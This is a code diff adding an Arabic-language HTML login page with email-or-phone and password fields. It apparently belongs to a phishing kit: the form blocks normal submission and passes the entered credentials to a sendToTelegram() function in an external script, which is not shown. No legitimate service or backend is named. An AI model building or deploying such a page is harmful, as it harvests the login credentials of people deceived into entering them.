@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول باستخدام البريد الإلكتروني أو رقم الهاتف وكلمة المرور</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <form onsubmit="event.preventDefault(); sendToTelegram();">
+            <div class="form-group">
+                <input type="text" id="emailOrPhone" name="emailOrPhone" required placeholder="البريد الإلكتروني أو رقم الهاتف">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" required placeholder="كلمة المرور">
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
